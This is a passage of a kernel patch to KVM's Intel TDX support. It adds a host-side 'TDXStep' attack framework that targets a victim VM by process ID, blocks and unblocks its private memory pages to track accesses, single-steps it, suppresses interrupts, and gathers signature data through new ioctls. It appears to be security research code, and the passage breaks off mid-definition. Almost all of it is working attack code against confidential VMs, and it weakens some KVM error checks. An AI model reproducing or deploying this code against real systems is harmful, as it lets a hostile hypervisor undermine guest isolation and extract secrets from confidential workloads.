++	if( tdx_step_config.attack_cfg.state == AS_WAITING_FOR_DONE_MARKER && vcpu->kvm->userspace_pid == tdx_step_config.victim_vm_pid) {
++		//printk("entering victim_td in AS_WAITING_FOR_DONE_MARKER");
++	}
+ 	tdx_vcpu_enter_exit(tdx);
++
++
++	spin_lock(&tdx_step_config_lock);
++	if(tdx->vcpu.kvm->userspace_pid == tdx_step_config.victim_vm_pid && tdx->exit_reason.basic == EXIT_REASON_EXTERNAL_INTERRUPT && tdexit_gpa(vcpu) == 0 && tdx_step_config.attack_cfg.state == AS_WAITING_FOR_DONE_MARKER && atomic_read(&t_mode) == 3) {
++		tdx_step_config.attack_cfg.current_step_count += 1;
++		tdx_step_config.attack_cfg.step_counts[tdx_step_config.attack_cfg.current_attack_iteration_idx] += 1;
++	}
++	//Count page fault triggers
++	/*if(tdx->vcpu.kvm->userspace_pid == tdx_step_config.victim_vm_pid && tdx_step_config.attack_cfg.state == AS_WAITING_FOR_DONE_MARKER && atomic_read(&t_mode) == 3) {
++		tdx_step_config.attack_cfg.current_step_count += 1;
++		tdx_step_config.attack_cfg.step_counts[tdx_step_config.attack_cfg.current_attack_iteration_idx] += 1;
++	}*/
++
++	if(tdx->vcpu.kvm->userspace_pid == tdx_step_config.victim_vm_pid && tdx_step_config.attack_cfg.state == AS_INJECT_PENDING_INTR ) {
++		tdx_step_config.attack_cfg.state = AS_TEARDOWN_PENDING;
++	}
++	spin_unlock(&tdx_step_config_lock);
++
+ 	if (vcpu_run_end_hook) {
+ 		struct kvm_tdx *t = to_kvm_tdx(vcpu->kvm);
+ 		struct OutData d = {
+@@ -1023,6 +1132,7 @@ fastpath_t tdx_vcpu_run(struct kvm_vcpu *vcpu)
+ 			&vcpu->kvm->arch.active_mmu_pages,
+ 			&vcpu->kvm->arch.tdp_mmu_roots,
+ 			tdx->tdvpr_pa,
++			vcpu->kvm->userspace_pid,
+ 		};
+ 		vcpu_run_end_hook(&d);
+ 	}
+@@ -1778,6 +1888,46 @@ static int tdx_sept_merge_private_spt(struct kvm *kvm, gfn_t gfn,
+ 	return 0;
+ }
+ 
++
++/**
++ * @brief blocks gfn. if "is_gfn_blocked" is not null, the status of the gfn is updated accordingly
++ * @param ignore_sept_free if set, SEPT_FREE tracking errors ( i.e. gpa not faulted to memory) do not result in an error. This is useful when using this function to track/untrack all memory
++ * @return true if successful
++*/
++bool my_tdx_sept_zap_private_spte(struct kvm *kvm, gfn_t gfn,
++				  enum pg_level level, bool ignore_sept_free)
++{
++	int tdx_level = pg_level_to_tdx_sept_level(level);
++	struct kvm_tdx *kvm_tdx = to_kvm_tdx(kvm);
++	gpa_t gpa = gfn_to_gpa(gfn) & KVM_HPAGE_MASK(level) ;
++	struct tdx_module_args out;
++	u64 err;
++	union tdx_ex_ret ex;
++	if( gpa & 0xfff0000000000000) {
++		printk("ERROR, gpa[63:52] should be all zero but we have 0x%llx!\n", gpa);
++	}
++	if( gpa & 0xfff) {
++		printk("ERROR, gpa[11:0] should be all zero but we have 0x%llx!\n", gpa);
++	}
++	err = tdh_mem_range_block(kvm_tdx->tdr_pa, gpa, tdx_level, &out);
++	ex.regs = out;
++
++	// print error, unless it is  SEPT_FREE. see "tdx_spte_entry_state" for definitions
++	// We ignore SEPT_FREE, because we call use this function 
++	if (err && ((ex.sept_walk.state != 0) || !ignore_sept_free) ) {
++		printk("%s gfn=0x%llx, level=%d, err=%llu\n", __FUNCTION__, gfn, level,err);
++		pr_tdx_error(TDH_MEM_RANGE_BLOCK, err, &out);
++		return false;
++	} else {
++		//update state in is_gfn_blocked
++		if ((is_gfn_blocked != NULL) &&
++		    (gfn <= max_gfn_is_gfn_blocked)) {
++			is_gfn_blocked[gfn] = BS_BLOCKED;
++		}
++		return true;
++	}
++}
++
+ static int tdx_sept_zap_private_spte(struct kvm *kvm, gfn_t gfn,
+ 				      enum pg_level level)
+ {
+@@ -1794,13 +1944,229 @@ static int tdx_sept_zap_private_spte(struct kvm *kvm, gfn_t gfn,
+ 	err = tdh_mem_range_block(kvm_tdx->tdr_pa, gpa, tdx_level, &out);
+ 	if (unlikely(err == TDX_ERROR_SEPT_BUSY))
+ 		return -EAGAIN;
+-	if (KVM_BUG_ON(err, kvm)) {
++	if (err) {
+ 		pr_tdx_error(TDH_MEM_RANGE_BLOCK, err, &out);
+ 		return -EIO;
+ 	}
++
++	//update state in is_gfn_blocked
++	if ((is_gfn_blocked != NULL) && (gfn <= max_gfn_is_gfn_blocked)) {
++		is_gfn_blocked[gfn] = BS_BLOCKED;
++	}
++
+ 	return 0;
+ }
+ 
++
++
++
++long kvm_start_tracking(struct kvm_vcpu *vcpu)
++{
++	long count = 0;
++	u64 iterator, iterat_max;
++	struct kvm_memslots *slots;
++	struct kvm_memory_slot *slot;
++	//int srcu_lock_retval;
++	int bkt, i;
++
++	lockdep_assert_held_read(&vcpu->kvm->mmu_lock);
++
++	/*loop over memory space and store max_gfn.
++        * I am not sure if the memory ranges, that we iterate here
++        * are contiguos and if "slots == NULL" ever hits.
++        * Otherwise we could simply sum up the pages
++        */
++	if (is_gfn_blocked == NULL) {
++		uint64_t max_gfn = 0;
++		printk("%s:%d [%s] computing max_gfn...\n", __FILE__, __LINE__,
++		       __FUNCTION__);
++		for (i = 0; i < kvm_arch_nr_memslot_as_ids(vcpu->kvm); i++) {
++			slots = __kvm_memslots(vcpu->kvm, i);
++			if (slots == NULL) {
++				continue;
++			}
++			kvm_for_each_memslot(slot, bkt, slots) {
++				if (slot == NULL) {
++					continue;
++				}
++				iterat_max = slot->base_gfn + slot->npages;
++				//srcu_lock_retval = srcu_read_lock(&vcpu->kvm->srcu);
++				//write_lock(&vcpu->kvm->mmu_lock);
++				for (iterator = 0; iterator < iterat_max;
++				     iterator++) {
++					slot = kvm_vcpu_gfn_to_memslot(
++						vcpu, iterator);
++					if (slot != NULL) {
++						if (iterator > max_gfn) {
++							max_gfn = iterator;
++						}
++					}
++					if (need_resched() ||
++					    rwlock_needbreak(
++						    &vcpu->kvm->mmu_lock)) {
++						cond_resched_rwlock_read(
++							&vcpu->kvm->mmu_lock);
++					}
++				}
++				//write_unlock(&vcpu->kvm->mmu_lock);
++				//srcu_read_unlock(&vcpu->kvm->srcu, srcu_lock_retval);
++			}
++		}
++		printk("%s:%d [%s]: max_gfn=0x%llx\n", __FILE__, __LINE__,
++		       __FUNCTION__, max_gfn);
++		is_gfn_blocked =
++			vzalloc(max_gfn * sizeof(tdx_step_block_status_t));
++		max_gfn_is_gfn_blocked = max_gfn;
++	}
++
++	for (i = 0; i < kvm_arch_nr_memslot_as_ids(vcpu->kvm) ; i++) {
++		slots = __kvm_memslots(vcpu->kvm, i);
++		if (slots == NULL) {
++			continue;
++		}
++		printk("%s:%d [%s] i=%d\n", __FILE__, __LINE__, __FUNCTION__,
++		       i);
++		kvm_for_each_memslot(slot, bkt, slots) {
++			if (slot == NULL) {
++				continue;
++			}
++			iterat_max = slot->base_gfn + slot->npages;
++			printk("%s:%d [%s] looping over range 0x0 to 0x%llx.\n",
++			       __FILE__, __LINE__, __FUNCTION__, iterat_max);
++			//srcu_lock_retval = srcu_read_lock(&vcpu->kvm->srcu);
++			//write_lock(&vcpu->kvm->mmu_lock);
++			for (iterator = 0; iterator < iterat_max; iterator++) {
++				slot = kvm_vcpu_gfn_to_memslot(vcpu, iterator);
++				if (slot != NULL) {
++					//if succesfull, this updates status in is_gfn_blocked
++					if (is_gfn_allowed_or_uninit(
++						    iterator) &&
++					    my_tdx_sept_zap_private_spte(
++						    vcpu->kvm, iterator,
++						    PG_LEVEL_4K, true)) {
++						count++;
++					}
++				}
++				if (need_resched() ||
++				    rwlock_needbreak(&vcpu->kvm->mmu_lock)) {
++					cond_resched_rwlock_read(
++						&vcpu->kvm->mmu_lock);
++				}
++			}
++			//write_unlock(&vcpu->kvm->mmu_lock);
++			//srcu_read_unlock(&vcpu->kvm->srcu, srcu_lock_retval);
++		}
++	}
++	if (count > 0) {
++		tdx_flush_tlb(vcpu);
++	}
++	return count;
++}
++EXPORT_SYMBOL(kvm_start_tracking);
++
++long kvm_stop_tracking(struct kvm_vcpu *vcpu)
++{
++	long count = 0;
++	u64 iterator, iterat_max;
++	struct kvm_memslots *slots;
++	struct kvm_memory_slot *slot;
++	//int srcu_lock_retval;
++	int bkt, i;
++	uint64_t uninited_gfns = 0;
++
++	lockdep_assert_held_read(&vcpu->kvm->mmu_lock);
++
++	if (is_gfn_blocked == NULL) {
++		printk("%s:%d [%s]: is_gfn_blocked is NULL, nothing todo",
++		       __FILE__, __LINE__, __FUNCTION__);
++		return 0;
++	}
++
++	for (i = 0; i < kvm_arch_nr_memslot_as_ids(vcpu->kvm); i++) {
++		slots = __kvm_memslots(vcpu->kvm, i);
++		if (slots == NULL) {
++			continue;
++		}
++		printk("%s:%d [%s] i=%d\n", __FILE__, __LINE__, __FUNCTION__,
++		       i);
++		kvm_for_each_memslot(slot, bkt, slots) {
++			if (slot == NULL) {
++				continue;
++			}
++			iterat_max = slot->base_gfn + slot->npages;
++			printk("%s:%d [%s] looping over range 0x0 to 0x%llx.\n",
++			       __FILE__, __LINE__, __FUNCTION__, iterat_max);
++			//srcu_lock_retval = srcu_read_lock(&vcpu->kvm->srcu);
++			//write_lock(&vcpu->kvm->mmu_lock);
++			for (iterator = 0; iterator < iterat_max; iterator++) {
++				slot = kvm_vcpu_gfn_to_memslot(vcpu, iterator);
++				if (slot != NULL) {
++					if ((is_gfn_blocked[iterator] ==
++					     BS_BLOCKED) &&
++					    my_tdx_sept_unzap_private_spte(
++						    vcpu, iterator,
++						    PG_LEVEL_4K, true)) {
++						count++;
++					}
++				}
++				if (need_resched() ||
++				    rwlock_needbreak(&vcpu->kvm->mmu_lock)) {
++					cond_resched_rwlock_read(
++						&vcpu->kvm->mmu_lock);
++				}
++			}
++			//write_unlock(&vcpu->kvm->mmu_lock);
++			//srcu_read_unlock(&vcpu->kvm->srcu, srcu_lock_retval);
++		}
++	}
++
++	for (i = 0; i < max_gfn_is_gfn_blocked; i++) {
++		switch (is_gfn_blocked[i]) {
++		case BS_UNINIT:
++			uninited_gfns += 1;
++			break;
++		case BS_BLOCKED:
++			if (is_gfn_blocked[i]) {
++				printk("%s:%d [%s] gpa 0x%x still blocked",
++				       __FILE__, __LINE__, __FUNCTION__,
++				       i << 12);
++			}
++			break;
++		default:
++			break;
++		}
++	}
++	printk("%s:%d [%s] %llu entries are not initialized\n", __FILE__, __LINE__,
++	       __FUNCTION__, uninited_gfns);
++
++	return count;
++}
++EXPORT_SYMBOL(kvm_stop_tracking);
++
++
++void my_split_all_pages(struct kvm_vcpu *vcpu, int target_level) {
++	struct kvm_memslots *slots;
++	struct kvm_memory_slot *slot;
++	int bkt, i, count;
++
++	count = 0;
++	for (i = 0; i < kvm_arch_nr_memslot_as_ids(vcpu->kvm); i++) {
++			slots = __kvm_memslots(vcpu->kvm, i);
++			if (slots == NULL) {
++				continue;
++			}
++			kvm_for_each_memslot(slot, bkt, slots) {
++				if (slot == NULL) {
++					continue;
++				}
++				kvm_mmu_slot_try_split_huge_pages(vcpu->kvm, slot, target_level);
++				count += 1;
++			}
++	}
++	printk("%s : call split all on %d kvm_memory_slot objects\n", __FUNCTION__, count);
++}
++EXPORT_SYMBOL(my_split_all_pages);
++
+ /*
+  * TLB shoot down procedure:
+  * There is a global epoch counter and each vcpu has local epoch counter.
+@@ -1874,6 +2240,56 @@ static void tdx_track(struct kvm *kvm)
+ 
+ }
+ 
++/**
++ * @brief unblocks gfn. If "is_gfn_blocked" is not null, the status of the gfn is updated accordingly
++ * @return true if successful
++*/
++bool my_tdx_sept_unzap_private_spte(struct kvm_vcpu *vcpu, gfn_t gfn,
++				    enum pg_level level, bool ignore_sept_free)
++{
++	int tdx_level = pg_level_to_tdx_sept_level(level);
++	struct kvm_tdx *kvm_tdx = to_kvm_tdx(vcpu->kvm);
++	gpa_t gpa = gfn_to_gpa(gfn);
++	struct tdx_module_args out;
++	u64 err;
++	union tdx_ex_ret ex;
++	uint64_t cnt;
++
++	tdx_flush_tlb_current(vcpu);
++
++	cnt = 0;
++	//printk("calling tdh_mem_range_unblock...\n");
++	do {
++		err = tdh_mem_range_unblock(kvm_tdx->tdr_pa, gpa, tdx_level, &out);
++
++		/*
++		 * tdh_mem_range_block() is accompanied with tdx_track() via kvm
++		 * remote tlb flush.  Wait for the caller of
++		 * tdh_mem_range_block() to complete TDX track.
++		 */
++		 if( cnt > 0) {
++			printk("loop iteration %llu\n", cnt);
++			if(err == TDX_TLB_TRACKING_NOT_DONE) {
++				printk("error was TDX_TLB_TRACKING_NOT_DONE\n");
++			}
++		 }
++	} while (err == (TDX_TLB_TRACKING_NOT_DONE | TDX_OPERAND_ID_SEPT));
++
++	// print error, unless it is  SEPT_FREE. see "tdx_spte_entry_state" for definitions
++	if (err && ((ex.sept_walk.state != 0) || !ignore_sept_free) ){
++		//printk("%s gfn=0x%llx, level=%d\n", __FUNCTION__, gfn, level);
++		//pr_tdx_error(TDH_MEM_RANGE_UNBLOCK, err, &out);
++		return false;
++	} else {
++		if ((is_gfn_blocked != NULL) &&
++		    (gfn <= max_gfn_is_gfn_blocked)) {
++			is_gfn_blocked[gfn] = 0;
++		}
++		return true;
++	}
++}
++EXPORT_SYMBOL(my_tdx_sept_unzap_private_spte);
++
+ static int tdx_sept_unzap_private_spte(struct kvm *kvm, gfn_t gfn,
+ 				       enum pg_level level)
+ {
+@@ -1894,10 +2310,14 @@ static int tdx_sept_unzap_private_spte(struct kvm *kvm, gfn_t gfn,
+ 	} while (err == (TDX_TLB_TRACKING_NOT_DONE | TDX_OPERAND_ID_SEPT));
+ 	if (unlikely(err == TDX_ERROR_SEPT_BUSY))
+ 		return -EAGAIN;
+-	if (KVM_BUG_ON(err, kvm)) {
++	if (err) {
+ 		pr_tdx_error(TDH_MEM_RANGE_UNBLOCK, err, &out);
+ 		return -EIO;
+ 	}
++	//update state in is_gfn_blocked
++	if ((is_gfn_blocked != NULL) && (gfn <= max_gfn_is_gfn_blocked)) {
++		is_gfn_blocked[gfn] = BS_ALLOWED;
++	}
+ 	return 0;
+ }
+ 
+@@ -1959,6 +2379,32 @@ void tdx_deliver_interrupt(struct kvm_lapic *apic, int delivery_mode,
+ 	struct kvm_vcpu *vcpu = apic->vcpu;
+ 	struct vcpu_tdx *tdx = to_tdx(vcpu);
+ 
++	/*spin_lock(&tdx_step_config_lock);
++	if( tdx_step_config.attack_cfg.state == AS_WAITING_FOR_DONE_MARKER && tdx_step_config.victim_vm_pid == vcpu->kvm->userspace_pid) {
++		spin_unlock(&tdx_step_config_lock);
++		printk("%s:%d [%s]  attempted interrupt injection during stepping. delivery_mode=0x%x, trig_mode=0x%x, vector=0x%x\n",
++			__FILE__,
++			__LINE__,
++			__FUNCTION__,
++			delivery_mode,
++			trig_mode,
++			vector
++		);
++		if ( (vector == 0xeb) || (vector == 0x28 )) {
++			spin_lock(&tdx_step_config_lock);
++			tdx_step_config.suppressed_interrupt_during_stepping = true;
++			tdx_step_config.suppressed_interrupt_delivery_mode = delivery_mode;
++			tdx_step_config.suppressed_interrupt_trig_mode = trig_mode;
++			tdx_step_config.suppressed_interrupt_vector = vector;
++			spin_unlock(&tdx_step_config_lock);
++			pi_test_and_clear_on(&tdx->pi_desc);
++			printk("blocked injection\n");
++			return;
++		}
++	} else {
++		spin_unlock(&tdx_step_config_lock);
++	}*/
++
+ 	/* TDX supports only posted interrupt.  No lapic emulation. */
+ 	__vmx_deliver_posted_interrupt(vcpu, &tdx->pi_desc, vector);
+ }
+@@ -3492,6 +3938,13 @@ int __init tdx_hardware_setup(struct kvm_x86_ops *x86_ops)
+ 	x86_ops->zap_private_spte = tdx_sept_zap_private_spte;
+ 	x86_ops->unzap_private_spte = tdx_sept_unzap_private_spte;
+ 
++
++	my_tdx_sept_zap_private_spte_fnptr = my_tdx_sept_zap_private_spte;
++	my_tdx_sept_unzap_private_spte_fnptr = my_tdx_sept_unzap_private_spte;
++	kvm_start_tracking_fnptr = kvm_start_tracking;
++	kvm_stop_tracking_fnptr = kvm_stop_tracking;
++	my_split_all_pages_fnptr = my_split_all_pages;
++
+ 	return 0;
+ 
+ out:
+diff --git a/arch/x86/kvm/x86.c b/arch/x86/kvm/x86.c
+index 1c813e565..e26600396 100644
+--- a/arch/x86/kvm/x86.c
++++ b/arch/x86/kvm/x86.c
+@@ -86,6 +86,8 @@
+ #include <asm/sgx.h>
+ #include <clocksource/hyperv_timer.h>
+ 
++#include <linux/tdx_step.h>
++
+ #define CREATE_TRACE_POINTS
+ #include "trace.h"
+ 
+@@ -10820,7 +10822,11 @@ EXPORT_SYMBOL_GPL(__kvm_request_immediate_exit);
+  * exiting to the userspace.  Otherwise, the value will be returned to the
+  * userspace.
+  */
+-void (* volatile vcpu_run_end_hook2)(void *) = 0;
++typedef struct {
++	void* vcpu;
++	int pid;
++} end_hook2_params;
++void (* volatile vcpu_run_end_hook2)(end_hook2_params* params) = 0;
+ EXPORT_SYMBOL_GPL(vcpu_run_end_hook2);
+ static int vcpu_enter_guest(struct kvm_vcpu *vcpu)
+ {
+@@ -11015,8 +11021,72 @@ static int vcpu_enter_guest(struct kvm_vcpu *vcpu)
+ 		goto cancel_injection;
+ 	}
+ 
++
++
++
++	//this snippet requires interrupts enabled
++	spin_lock(&tdx_step_config_lock);
++	if( vcpu->kvm->userspace_pid == tdx_step_config.victim_vm_pid) {
++		if ( (tdx_step_config.attack_cfg.state == AS_TEARDOWN_PENDING) ||
++	     (tdx_step_config.attack_cfg.state == AS_WAITING_FOR_REENTER)) {
++			if( tdx_step_config.attack_cfg.state == AS_TEARDOWN_PENDING ) {
++				//restart attack cycle if we want more iterations.
++				//-1 in upper bound because we already completed the iteration when we come here. E.g., for want=1 if we come here with curr=0
++				//we have already completed "idx 0". Thus without -1 we would do one iteration to much
++				if(tdx_step_config.attack_cfg.current_attack_iteration_idx < (tdx_step_config.attack_cfg.want_attack_iterations - 1) ) {
++					tdx_step_config.attack_cfg.state = AS_SETUP_PENDING;
++					printk("finished iteration idx %llu with step count %llu\n", tdx_step_config.attack_cfg.current_attack_iteration_idx,tdx_step_config.attack_cfg.current_step_count);
++					//reset state for next iteration
++					tdx_step_config.attack_cfg.tts_idx = 0;
++					tdx_step_config.attack_cfg.current_attack_iteration_idx += 1;
++					tdx_step_config.attack_cfg.current_step_count = 0;
++
++				} else {
++					uint64_t time_delta;
++					time_delta = ktime_get_ns() - tdx_step_config.attack_cfg.start_time;
++					TDXSTEP_LOG_DBG("%s:%d setting attack state to AS_INACTIVE, iteration idx %llu, step count %llu", __FILE__, __LINE__, tdx_step_config.attack_cfg.current_attack_iteration_idx, tdx_step_config.attack_cfg.current_step_count);
++					tdx_step_config.attack_cfg.state = AS_INACTIVE;
++					tdx_step_config.attack_cfg.current_step_count = 0;
++					//convert absolute values to "diff to previous reading"
++				
++					//TODO: export single step data
++					/*for( idx = 0; idx < tdx_step_config.attack_cfg.want_attack_iterations; idx++) {
++						uint64_t hit_buf = tdx_step_config.attack_cfg.hit_counter_data[idx];
++						uint64_t exit_buf = tdx_step_config.attack_cfg.exit_count_data[idx];
++
++						tdx_step_config.attack_cfg.hit_counter_data[idx] -= prev_hit_counter_abs;
++						tdx_step_config.attack_cfg.exit_count_data[idx] -= prev_exit_count_abs;
++
++						prev_hit_counter_abs = hit_buf;
++						prev_exit_count_abs = exit_buf;
++					}*/
++					//print values
++					/*for( idx = 0; idx < tdx_step_config.attack_cfg.want_attack_iterations; idx++) {
++						uint64_t hits = tdx_step_config.attack_cfg.hit_counter_data[idx];
++						uint64_t count = tdx_step_config.attack_cfg.exit_count_data[idx];
++						uint64_t estimated = (hits - (count-1)*3)/4;
++						printk("results run %04llu: estimated=%04llu, hits=%04llu, count=%04llu",
++							idx, estimated, hits, count);
++					}*/
++					printk("Required time: %llu ns\n", time_delta);
++				}
++			}
++		}
++	}
++	spin_unlock(&tdx_step_config_lock);
++
++	if (vcpu_run_end_hook2) {
++		end_hook2_params params = {
++			.vcpu = (void*)vcpu,
++			.pid = vcpu->kvm->userspace_pid,
++		};
++		vcpu_run_end_hook2(&params);
++	}
++
+ 	preempt_disable();
+ 
++
++
+ 	static_call(kvm_x86_prepare_switch_to_guest)(vcpu);
+ 
+ 	/*
+@@ -11089,6 +11159,10 @@ static int vcpu_enter_guest(struct kvm_vcpu *vcpu)
+ 
+ 	guest_timing_enter_irqoff();
+ 
++	//
++	// luca: MAIN run loop
++	//
++
+ 	for (;;) {
+ 		/*
+ 		 * Assert that vCPU vs. VM APICv state is consistent.  An APICv
+@@ -11099,6 +11173,7 @@ static int vcpu_enter_guest(struct kvm_vcpu *vcpu)
+ 		WARN_ON_ONCE((kvm_vcpu_apicv_activated(vcpu) != kvm_vcpu_apicv_active(vcpu)) &&
+ 			     (kvm_get_apic_mode(vcpu) != LAPIC_MODE_DISABLED));
+ 
++		//luca: this eventualloy calls tdx_vcpu_run
+ 		exit_fastpath = static_call(kvm_x86_vcpu_run)(vcpu);
+ 		if (likely(exit_fastpath != EXIT_FASTPATH_REENTER_GUEST))
+ 			break;
+@@ -11172,9 +11247,6 @@ static int vcpu_enter_guest(struct kvm_vcpu *vcpu)
+ 	kvm_before_interrupt(vcpu, KVM_HANDLING_IRQ);
+ 	local_irq_enable();
+ 	++vcpu->stat.exits;
+-	if (vcpu_run_end_hook2) {
+-		vcpu_run_end_hook2(vcpu);
+-	}
+ 	local_irq_disable();
+ 	kvm_after_interrupt(vcpu);
+ 
+@@ -11206,6 +11278,7 @@ static int vcpu_enter_guest(struct kvm_vcpu *vcpu)
+ 	if (vcpu->arch.apic_attention)
+ 		kvm_lapic_sync_from_vapic(vcpu);
+ 
++	//luca: call chain that handles page faults
+ 	r = static_call(kvm_x86_handle_exit)(vcpu, exit_fastpath);
+ 
+ 	return r;
+diff --git a/include/linux/tdx_step.h b/include/linux/tdx_step.h
+new file mode 100644
+index 000000000..67f2fa976
+--- /dev/null
++++ b/include/linux/tdx_step.h
+@@ -0,0 +1,170 @@
++#ifndef TDX_STEP_H
++#define TDX_STEP_H
++
++#include <linux/types.h>
++#include <linux/spinlock.h>
++#include <linux/kvm.h>
++#include <linux/kvm_types.h>
++
++#define TDXSTEP_LOG_DBG(fmt, ...) ;//printk(fmt, ##__VA_ARGS__);
++
++#define TDXSTEP_MMU_LOG_LEVEL 2
++#if TDXSTEP_MMU_LOG_LEVEL <= 2
++	#define TDXSTEP_MMU_LOG_INFO( fmt, ...) printk(fmt, ##__VA_ARGS__);
++#else
++	#define TDXSTEP_MMU_LOG_INFO( fmt, ...) ;
++#endif
++#if TDXSTEP_MMU_LOG_LEVEL <= 1
++	#define TDXSTEP_MMU_LOG_DBG( fmt, ...) printk(fmt, ##__VA_ARGS__);
++#else
++	#define TDXSTEP_MMU_LOG_DBG( fmt, ...) ;
++#endif
++
++#define TDX_STEP_SHARED_SIGBUF_PAGES 256
++
++
++typedef enum {
++	AS_INACTIVE,
++	//Waiting for attack configuration to be applied
++	AS_SETUP_PENDING,
++	//wait for pagefault on target gpa
++	AS_WAITING_FOR_TARGET,
++	//Single step until we get parge fault for done marker
++	AS_WAITING_FOR_DONE_MARKER,
++	//We got our target and are now waiting for the end of the sequence
++	AS_WAITING_FOR_END_OF_SEQ,
++	//We got an unexpected access during AS_WAITING_FOR_DONE_MARKER and are now waiting for a trigger to return to that state
++	AS_WAITING_FOR_REENTER,
++	//Test injection idea
++	AS_INJECT_PENDING_INTR,
++	//Waiting for single step configuration to be cleared
++	AS_TEARDOWN_PENDING,
++	AS_MAX,
++} attack_state_t;
++
++typedef struct {
++	//one attack == one `target_trigger_sequence` cycle. This tracks the number of cycles
++	uint64_t current_attack_iteration_idx;
++	uint64_t want_attack_iterations;
++
++	uint64_t target_gpa;
++
++
++	//tracking sequence to stop at the desired execution of target_gpa
++	uint64_t* target_trigger_sequence; //TODO: rename to something like "program model"
++	uint64_t target_trigger_sequence_len;
++	//entry from target_trigger_sequence that is currently tracked. Only valid while in AS_WAITING_FOR_TARGET state
++	uint64_t tts_idx;
++
++	//position in `target_trigger_sequence` at which we want to launch our attack
++	uint64_t tts_attack_pos;
++
++	uint64_t* attack_phase_allowed_gpas;
++	uint64_t attack_phase_allowed_gpas_len;
++
++	uint64_t done_marker_gpa;
++	attack_state_t state;
++	uint64_t *ignored_gpas;
++	uint64_t ignored_gpas_len;
++
++	//used to track unrelated faults during the AS_WAITING_FOR_DONE_MARKER state
++	uint64_t unrelated_faults[30];
++	//actually used length of "unrelated_faults" in the last attack run
++	uint64_t unrelated_faults_used_len;
++
++	//  The last_fault_... fields are computed after TDEXIT in tdx.c. I introduced them because the regular logic used in the page fault handling path does not seem to apply for TDX GPA faults (we get clearly wrong access types)
++
++	//True if most recent TD GPA fault was due to instruction fetch
++	bool last_fault_exec;
++	//True if most recent TD GPA fault was due to write
++	bool last_fault_write;
++	// True if most recent TD GPA fault was due to read
++	bool last_fault_read;
++
++	//timetamp in nano seconds. Used to compute required time for attack.
++	uint64_t start_time;
++
++	uint64_t current_step_count;
++	//length "want_attack_iterations". Stores measured step count for each attack iteration
++	//only valid while attack is running
++	uint64_t* step_counts;
++
++
++	uint64_t shared_sigbuf_gpa;
++	struct page* pinned_page_shared_sigbuf[TDX_STEP_SHARED_SIGBUF_PAGES];
++    uint8_t* mapping_shared_sigbuf;
++	
++} attack_cfg_t;
++
++typedef struct {
++	int victim_vm_pid;
++    uint64_t entries_since_stepping_attack;
++	//number of entries during the active attack phase
++	uint64_t entries_while_active_stepping_attack;
++
++    attack_cfg_t attack_cfg;
++
++    struct page* pinned_page_shared_mem;
++    uint64_t* mapping_shared_mem;
++    bool suppressed_interrupt_during_stepping;
++	int suppressed_interrupt_delivery_mode;
++	int suppressed_interrupt_trig_mode;
++	int suppressed_interrupt_vector;
++} tdx_step_config_t;
++
++extern atomic_t t_mode;
++extern spinlock_t tdx_step_config_lock;
++extern tdx_step_config_t tdx_step_config;
++
++extern spinlock_t tdx_step_inside_vm_lock;
++extern atomic_t tdx_step_inside_vm;
++
++typedef enum {
++	BS_UNINIT,
++	BS_BLOCKED,
++	BS_ALLOWED,
++} tdx_step_block_status_t;
++
++bool is_gfn_blocked_or_uninit(uint64_t gfn);
++bool is_gfn_allowed_or_uninit(uint64_t gfn);
++bool is_valid_is_gfn_blocked_index(uint64_t gfn);
++//FIXME: re-evaluate if these need to be "exported" before comitting
++extern tdx_step_block_status_t *is_gfn_blocked;
++extern uint64_t max_gfn_is_gfn_blocked;
++
++//make sure all of this is on one line. otherwise the __LINE__ value is very hard to parse
++//#define LOG_IF_TARGET_GPA(got_gpa) do { if( (tdx_step_config.attack_cfg.state == AS_WAITING_FOR_TARGET) && ( (got_gpa) == tdx_step_config.attack_cfg. target_gpa) ) { printk("%s:%d [%s] target_gpa fault rippling through\n", __FILE__, __LINE__, __FUNCTION__); } } while(0);
++#define LOG_IF_TARGET_GPA(got_gpa) \
++	do {                       \
++		;                  \
++	} while (0);
++
++typedef bool (*zap_fnptr_t)(struct kvm *, gfn_t, enum pg_level, bool);
++typedef bool (*unzap_fnptr_t)(struct kvm_vcpu *, gfn_t, enum pg_level, bool);
++typedef long (*start_stop_track_all_fnptr_t)(struct kvm_vcpu *);
++extern zap_fnptr_t my_tdx_sept_zap_private_spte_fnptr;
++extern unzap_fnptr_t my_tdx_sept_unzap_private_spte_fnptr;
++extern start_stop_track_all_fnptr_t kvm_start_tracking_fnptr;
++extern start_stop_track_all_fnptr_t kvm_stop_tracking_fnptr;
++
++typedef void(*my_split_fnptr_t)(struct kvm_vcpu*, int);
++extern my_split_fnptr_t my_split_all_pages_fnptr;
++
++bool my_tdx_sept_zap_private_spte(struct kvm *kvm, gfn_t gfn,
++				  enum pg_level level, bool ignore_sept_free);
++bool my_tdx_sept_unzap_private_spte(struct kvm_vcpu *vcpu, gfn_t gfn,
++				    enum pg_level level, bool ignore_sept_free);
++long kvm_start_tracking(struct kvm_vcpu *vcpu);
++long kvm_stop_tracking(struct kvm_vcpu *vcpu);
++
++typedef struct  {
++	struct kvm* kvm;
++	bool called_split_pages;
++	bool valid;
++} my_vm_state_t;
++my_vm_state_t* get_vm(int pid);
++
++attack_state_t get_attack_state(void);
++void my_split_all_pages(struct kvm_vcpu *vcpu, int target_level);
++
++#endif
+\ No newline at end of file
+diff --git a/include/uapi/linux/kvm.h b/include/uapi/linux/kvm.h
+index bd61e533d..4a973110b 100644
+--- a/include/uapi/linux/kvm.h
++++ b/include/uapi/linux/kvm.h
+@@ -2329,4 +2329,88 @@ struct kvm_memory_mapping {
+ 	__u64 source;
+ };
+ 
++
++// TDXStep IOCTLs
++
++typedef enum {
++  FREQ_SNEAK,
++  STUMBLE_STEP,
++  GRAZ_STEP,
++} attack_type_t;
++
++typedef struct {
++  // length of "want_attack_iterations" number of measured steps for each attack iteration
++  uint64_t *step_counts;
++  // has to have length exactly 256*4096 bytes. Will be filled with
++  // want_attack_iterations many signatures. Format: For each signature, 1 byte
++  // length field that states the length of the signature in bytes followed by
++  // the siganture
++  uint8_t *signature_data;
++} graz_step_results_t;
++
++
++
++typedef struct {
++	uint64_t gpa;
++	int vm_pid;
++} tdx_step_block_page_t;
++#define TDX_STEP_BLOCK_PAGE _IOWR(KVMIO, 0xf0, tdx_step_block_page_t)
++
++typedef struct {
++	uint64_t gpa;
++	int vm_pid;
++} tdx_step_unblock_page_t;
++#define TDX_STEP_UNLBOCK_PAGE _IOWR(KVMIO, 0xf1, tdx_step_unblock_page_t)
++
++typedef struct {
++
++	//pid of the vm that we want to attack
++	int victim_vm_pid;
++
++	uint64_t target_gpa;
++	//tracking sequence to stop at the desired execution of target_gpa
